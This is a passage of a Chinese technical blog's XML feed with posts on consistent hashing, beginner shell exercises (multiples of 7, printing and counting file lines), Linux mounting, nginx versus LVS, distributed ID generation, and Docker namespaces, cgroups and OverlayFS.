title="总结"></a><strong>总结</strong></h2><p>不同的负载均衡算法适用的业务场景也不同的。<br>轮训这类的策略只能适用与每个节点的数据都是相同的场景，访问任意节点都能请求到数据。但是不适用分布式系统，因为分布式系统意味着数据水平切分到了不同的节点上，访问数据的时候，一定要寻址存储该数据的节点。<br>哈希算法虽然能建立数据和节点的映射关系，但是每次在节点数量发生变化的时候，最坏情况下所有数据都需要迁移，这样太麻烦了，所以不适用节点数量变化的场景。<br>为了减少迁移的数据量，就出现了一致性哈希算法。<br>一致性哈希是指将「存储节点」和「数据」都映射到一个首尾相连的哈希环上，如果增加或者移除一个节点，仅影响该节点在哈希环上顺时针相邻的后继节点，其它数据也不会受到影响。<br>但是一致性哈希算法不能够均匀的分布节点，会出现大量请求都集中在一个节点的情况，在这种情况下进行容灾与扩容时，容易出现雪崩的连锁反应。<br>为了解决一致性哈希算法不能够均匀的分布节点的问题，就需要引入虚拟节点，对一个真实节点做多个副本。不再将真实节点映射到哈希环上，而是将虚拟节点映射到哈希环上，并将虚拟节点映射到实际节点，所以这里有「两层」映射关系。<br>引入虚拟节点后，可以会提高节点的均衡度，还会提高系统的稳定性。所以，带虚拟节点的一致性哈希方法不仅适合硬件配置不同的节点的场景，而且适合节点规模会发生变化的场景。<br>完！</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 负载均衡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之输出7的倍数</title>
      <link href="/2022/04/04/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA7%E7%9A%84%E5%80%8D%E6%95%B0/"/>
      <url>/2022/04/04/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA7%E7%9A%84%E5%80%8D%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>写一个 bash脚本以输出数字 0 到 500 中 7 的倍数(0 7 14 21…)的命令</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><ul><li>正向</li></ul><ol><li>从0数到500</li><li>每个数字对7进行取模。如果%7=0，则表示为倍数</li></ol><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">num=0</span><br><span class="line">while (( $num&lt;=500 ))</span><br><span class="line">do</span><br><span class="line">if (( $num%7==0 ))</span><br><span class="line">then</span><br><span class="line">    echo $num</span><br><span class="line">fi</span><br><span class="line">    let <span class="string">&quot;num++&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure><ul><li>逆向</li></ul><ol><li>初始值=0，可直接输出</li><li>以7为倍数进行自增并输出。得到的结果都是满足题意<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">num=0</span><br><span class="line">while (( $num&lt;=500 ))</span><br><span class="line">do</span><br><span class="line">    echo $num</span><br><span class="line">     let <span class="string">&quot;num+=7&quot;</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之打印文件的最后5行</title>
      <link href="/2022/04/03/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%80%E5%90%8E5%E8%A1%8C/"/>
      <url>/2022/04/03/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%80%E5%90%8E5%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>经常查看日志的时候，会从文件的末尾往前查看，于是请你写一个 bash脚本以输出一个文本文件 nowcoder.txt中的最后5行<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a = 10;</span><br><span class="line">int b = 100;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int b = 100;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>查看文件的前5行，可以使用head命令，如<br><code>head -5 filename</code><br>查看文件的后5行，可以使用tail命令，如：<br><code>tail -5 filename 或 tail -n 5 filename</code><br>查看文件中间一段，你可以使用sed命令，如：<br><code>sed -n ‘5,20p’ filename</code><br>这样你就可以只查看文件的第5行到第20行。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux挂载是什么意思</title>
      <link href="/2022/04/02/Linux%E6%8C%82%E8%BD%BD%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/"/>
      <url>/2022/04/02/Linux%E6%8C%82%E8%BD%BD%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<p>挂载就是将某个未使用的空间或可移动设备的存储空间指向一个目录，这样，通过该目录就可以访问你的空间了。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx与lvs的区别</title>
      <link href="/2022/04/02/nginx%E4%B8%8Elvs%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/04/02/nginx%E4%B8%8Elvs%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><p> lvs和nginx都可以用作多机负载方案，他们各有优缺点，在生产环境中需要好好分析实际情况并加以利用。</p></blockquote><ol><li>nginx工作在网络的第7层，所以它可以针对http应用本身来做分流策略，比如针对域名、目录结构等，相比之下lvs并不具备这样的功能，因为lvs工作在第4层，但是他工作的范围更广一些。</li><li>nginx可以检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点。目前lvs中ldirectd也能支持针对服务器内部的情况来监控，但lvs的原理使其不能重发请求。<strong>重发请求</strong>这点，比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，nginx会把上传切到另一台服务器重新处理，而lvs就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而恼火。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之统计文件的行数</title>
      <link href="/2022/04/02/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E6%95%B0/"/>
      <url>/2022/04/02/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>写一个 bash脚本以输出一个文本文件 nowcoder.txt中的行数<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a = 10;</span><br><span class="line">    int b = 100;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你的脚本应当输出：<br>9</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="方法（1）"><a href="#方法（1）" class="headerlink" title="方法（1）"></a>方法（1）</h3><ul><li> wc -[clw]分别代表字节数，行数，字数</li></ul><p>wc -l 是用来查看文件的newline的数量的。<br>在linux系统中，newline字符就是 \n 字符。<br><code>wc -l ./nowcoder.txt</code><br>8 ./nowcoder.txt<br>输出中包含了文件名，因此再做一下处理：<br><code>wc-l ./nowcoder.txt | awk&#39;&#123;print $1&#125;&#39;</code></p><h3 id="方法（2）"><a href="#方法（2）" class="headerlink" title="方法（2）"></a>方法（2）</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-awk.html">https://www.runoob.com/linux/linux-comm-awk.html</a></li></ul><p><code>#!/bin/bash</code><br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt |tail -n 1</code><br>awk 可以打印所有行的行号<br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt</code><br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>该输出的最后一行就是文件的行数，结合 tail 就可以获取到文件的行数<br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt |tail -n 1</code><br>8</p><h3 id="方法（3）"><a href="#方法（3）" class="headerlink" title="方法（3）"></a>方法（3）</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-awk.html">https://www.runoob.com/linux/linux-comm-awk.html</a></li></ul><p>awk 本身就可以只打印最后一行，因此一个 awk 脚本也可以搞定<br><code>awk &#39;END&#123;print NR&#125;&#39; ./nowcoder.txt</code></p><h3 id="方法（4）"><a href="#方法（4）" class="headerlink" title="方法（4）"></a>方法（4）</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-grep.html">https://www.runoob.com/linux/linux-comm-grep.html</a></li></ul><p>使用 grep 搜索 “”，然后利用 grep 自带的功能统计行<br><code>grep -c &quot;&quot; ./nowcoder.txt </code><br>或<br><code>grep -n &quot;&quot; ./nowcoder.txt  | awk -F &quot;:&quot; &#39;&#123;print $1 &#125;&#39; | tail -n 1</code></p><h3 id="方法（5）"><a href="#方法（5）" class="headerlink" title="方法（5）"></a>方法（5）</h3><p>sed 统计行<br><code>sed -n &#39;$=&#39; ./nowcoder.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UUID：如何高效生成全局的唯一ID？</title>
      <link href="/2022/03/29/UUID%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E7%94%9F%E6%88%90%E5%85%A8%E5%B1%80%E7%9A%84%E5%94%AF%E4%B8%80ID%EF%BC%9F/"/>
      <url>/2022/03/29/UUID%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E7%94%9F%E6%88%90%E5%85%A8%E5%B1%80%E7%9A%84%E5%94%AF%E4%B8%80ID%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="单点生成器"><a href="#单点生成器" class="headerlink" title="单点生成器"></a>单点生成器</h2><p><strong>直接在内存中自增，缺点是内存崩了全没了。</strong></p><h2 id="远程调用数据库"><a href="#远程调用数据库" class="headerlink" title="远程调用数据库"></a>远程调用数据库</h2><p><strong>配置足够多的数据库，每个负责维护不同的id段，业务这边每次请求一批id放到内存，用完了再继续找数据库要。</strong></p><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>可以翻译成全局唯一ID，和前面我们思考的两种方案不同，这次的1D不再需要通过远程调用一个独立的服务产生，而 是直接在业务侧的服务本地产生，所以 UUID 通常也被实现为一个库，供业务方直接调用。 UUID 有很多个不同的版本，网络上不同库的实现也可能会略有区别。 UUID 一共包含32位16 进制数，也就是相当于128位二进制数，显示的时候被分为8-4- 4-4-12几个部分，看一个例子：<br><code>0725f9ac-8cc1-11ec-a8a3-0242ac120002</code><br>有很多版本，比如：</p><ul><li>第三个版本的方法是<strong>基于名字计算的</strong>，名字由用户传入，它保证了不同空间<strong>不同名字下的 UUID 都具有唯一性，而相同空间相同名字下的 UUID 则是相同的</strong></li><li>第四个版本更加常用也更加直接一点，就是<strong>直接基于随机性进行计算</strong>，因为UUID非常长，所以其重复概率可以忽略不计。</li></ul><h2 id="Snowflake"><a href="#Snowflake" class="headerlink" title="Snowflake"></a>Snowflake</h2><p>是一种引入了机器编号和时间信息的分布式ID 生成算法。在理论上来说 Snowfake每秒可以产生 400w+个序号。<br><strong>主要思路就是先根据 name， 初始化 Snowflake generator 的实例，开发者需要保证 name 的唯一性；然后在需要生成新的ID的时候，用当前时间戳加上当前时间戳内(也就是某一毫 秒内)的计数器，拼接得到 UUID，如果某一毫秒内的计数器被耗尽达到上限，会死循环直至 这1ms过去。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UUID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker核心技术</title>
      <link href="/2022/03/21/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/03/21/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="传统分层架构vs微服务"><a href="#传统分层架构vs微服务" class="headerlink" title="传统分层架构vs微服务"></a>传统分层架构vs微服务</h2><p>传统分册：项目太大了难以维护<br>微服务：服务和服务之间走轻量级的协议比如rest，容易维护，每个部分负责其中一部分服务。<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/0.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/1.png"></p><h3 id="微服务改造"><a href="#微服务改造" class="headerlink" title="微服务改造"></a>微服务改造</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/2.png"></p><h3 id="微服务间通讯"><a href="#微服务间通讯" class="headerlink" title="微服务间通讯"></a>微服务间通讯</h3><h4 id="点对点"><a href="#点对点" class="headerlink" title="点对点"></a>点对点</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/3.png"></h4><h4 id="API网关"><a href="#API网关" class="headerlink" title="API网关"></a>API网关</h4><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/4.png"></p><h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><p> <img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/5.png"></p><h3 id="为什么用Docker"><a href="#为什么用Docker" class="headerlink" title="为什么用Docker"></a>为什么用Docker</h3><p>虚拟化要虚拟一个完整的操作系统，有额外开销，容器化共享host的kernel<br>不需要虚拟操作系统所以启动更快<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/6.png"></p><h3 id="虚拟机和容器运行态的对比"><a href="#虚拟机和容器运行态的对比" class="headerlink" title="虚拟机和容器运行态的对比"></a>虚拟机和容器运行态的对比</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/7.png"></p><h3 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/8.png"></p><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/9.png"></p><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/10.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/11.png"></p><h3 id="Docker-File"><a href="#Docker-File" class="headerlink" title="Docker File"></a>Docker File</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/12.png"></p><h3 id="容器标准"><a href="#容器标准" class="headerlink" title="容器标准"></a>容器标准</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/13.png"></p><h3 id="容器主要特性"><a href="#容器主要特性" class="headerlink" title="容器主要特性"></a>容器主要特性</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/14.png"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/15.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/16.png"></p><h3 id="Linux-对-Namespace-操作方法"><a href="#Linux-对-Namespace-操作方法" class="headerlink" title="Linux 对 Namespace 操作方法"></a>Linux 对 Namespace 操作方法</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/17.png"></p><h3 id="隔离性-Linux-Namespace"><a href="#隔离性-Linux-Namespace" class="headerlink" title="隔离性- Linux Namespace"></a>隔离性- Linux Namespace</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/18.png"><br>比如不同的namespace里看到的pid是不同的<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/19.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/20.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/21.png"></p><h3 id="关于-namespace-的常用操作"><a href="#关于-namespace-的常用操作" class="headerlink" title="关于 namespace 的常用操作"></a>关于 namespace 的常用操作</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/22.png"><br>nsenter用法：<br><code>docker inspect -f &#39;&#123;&#123;.State.Pid&#125;&#125;&#39; &lt;container&gt; </code>获取pid<br>再<code>nsenter -t &lt;pid&gt; -n ip addr0</code></p><h2 id="Cgroups"><a href="#Cgroups" class="headerlink" title="Cgroups"></a>Cgroups</h2><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/23.png"></p><h3 id="Linux-内核代码中-Cgroups的实现"><a href="#Linux-内核代码中-Cgroups的实现" class="headerlink" title="Linux 内核代码中 Cgroups的实现"></a>Linux 内核代码中 Cgroups的实现</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/24.png"></p><h3 id="可配额-可度量-Control-Groups-cgroups"><a href="#可配额-可度量-Control-Groups-cgroups" class="headerlink" title="可配额/可度量-Control Groups (cgroups)"></a>可配额/可度量-Control Groups (cgroups)</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/25.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/26.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/27.png"></p><h3 id="CPU子系统"><a href="#CPU子系统" class="headerlink" title="CPU子系统"></a>CPU子系统</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/28.png"></p><h3 id="Linux调度器"><a href="#Linux调度器" class="headerlink" title="Linux调度器"></a>Linux调度器</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/29.png"></p><h3 id="CFS调度器"><a href="#CFS调度器" class="headerlink" title="CFS调度器"></a>CFS调度器</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/30.png"></p><h3 id="CFS中的vruntime红黑树"><a href="#CFS中的vruntime红黑树" class="headerlink" title="CFS中的vruntime红黑树"></a>CFS中的vruntime红黑树</h3><p>每次都从左下角取，取出来之后其他结点值不变，运行好了再把这个节点放回树里。<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/31.png"></p><h3 id="CFS进程调度"><a href="#CFS进程调度" class="headerlink" title="CFS进程调度"></a>CFS进程调度</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/32.png">总结：Docker起进程的时候就是通过cgroup控制一下</p><h3 id="CPU-子系统练习"><a href="#CPU-子系统练习" class="headerlink" title="CPU 子系统练习"></a>CPU 子系统练习</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/33.png"><br>以下代码吃掉了两个cpu<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/34.png"><br>用cgroup来管理它们<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/35.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/36.png"><br>用下面的这些来管理<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/37.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/38.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/39.png"><br>用cgroup来控制这个进程<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/40.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/41.png"><br>让他吃1/10的cpu<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/42.png"></p><h3 id="cpuacct子系统"><a href="#cpuacct子系统" class="headerlink" title="cpuacct子系统"></a>cpuacct子系统</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/43.png"></p><h3 id="Memory子系统"><a href="#Memory子系统" class="headerlink" title="Memory子系统"></a>Memory子系统</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/44.png"></p><h3 id="Cgroup-driver"><a href="#Cgroup-driver" class="headerlink" title="Cgroup driver"></a>Cgroup driver</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/45.png"><br>修改方法：<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/46.png"></p><h3 id="安装k8s"><a href="#安装k8s" class="headerlink" title="安装k8s"></a>安装k8s</h3><p><a href="https://github.com/cncamp/101/tree/master/k8s-install">https://github.com/cncamp/101/tree/master/k8s-install</a><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/47.png"><br><a href="https://github.com/zsnmwy/101/discussions/1">https://github.com/zsnmwy/101/discussions/1</a></p><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>namespace的作用是把应用进程放到一个封闭的环境里，相当于我的这个应用的上下游的依赖包括网络都在一个隔离环境里<br>cgroup用于给这个进程一定的资源配额<br>有了他们两个一个小的模拟的操作系统就已经在那了，就可以跑服务了<br>但是还要有一个文件系统，容器的文件系统是怎么做的<br>Docker的创新点就在于他的文件系统</p><h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/48.png"></p><h3 id="容器镜像"><a href="#容器镜像" class="headerlink" title="容器镜像"></a>容器镜像</h3><p>容器是分层的，解决了所有应用的文件分发问题，已经做过的就不用做了<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/49.png"></p><h3 id="Docker的文件系统"><a href="#Docker的文件系统" class="headerlink" title="Docker的文件系统"></a>Docker的文件系统</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/50.png"></p><h3 id="Docker启动"><a href="#Docker启动" class="headerlink" title="Docker启动"></a>Docker启动</h3><p><strong>无bootfs，复用主机kernel</strong><br>**有rootfs，这个rootfs通过容器驱动加载出来，并且union mount给这个进程 **<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/51.png"></p><h3 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h3><p>所有的进程共享基础层，增量变更，有变更就把 下面的层设为read only，往上加<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/52.png"></p><h3 id="容器存储驱动"><a href="#容器存储驱动" class="headerlink" title="容器存储驱动"></a>容器存储驱动</h3><p>主流overlayFS<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/53.png"><br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/54.png"></p><h3 id="以-OverlayFS-为例"><a href="#以-OverlayFS-为例" class="headerlink" title="以 OverlayFS 为例"></a>以 OverlayFS 为例</h3><p>用于多个目录合并成一个目录，下图中的文件mount代表了实际可见的文件<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/55.png"><br>用docker inspect命令可以看到用overlayFS构建的文件系统<br><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/56.png"><br>docker的每一层都要mount<br>好处就是这样把所有运行所需的运行环境配置文件全部放到自己容器进程的mnt namespace里，确保容器所需要的所有依赖和配置都在这个运行环境里，这样我把他放到其他系统里才能完整的replay出来</p><h3 id="OCI-容器标准"><a href="#OCI-容器标准" class="headerlink" title="OCI 容器标准"></a>OCI 容器标准</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/57.png"></p><h3 id="Docker-引擎架构"><a href="#Docker-引擎架构" class="headerlink" title="Docker 引擎架构"></a>Docker 引擎架构</h3><p><img src="http://106.12.125.218/medias/medias/Docker%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/58.png"><br>containerd的创举是和用户态的进程解绑了，升级docker之后用户态进程不受影响。<br>shim与容器是1对1的</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="解决主机到容器以及容器之间互相访问"><a 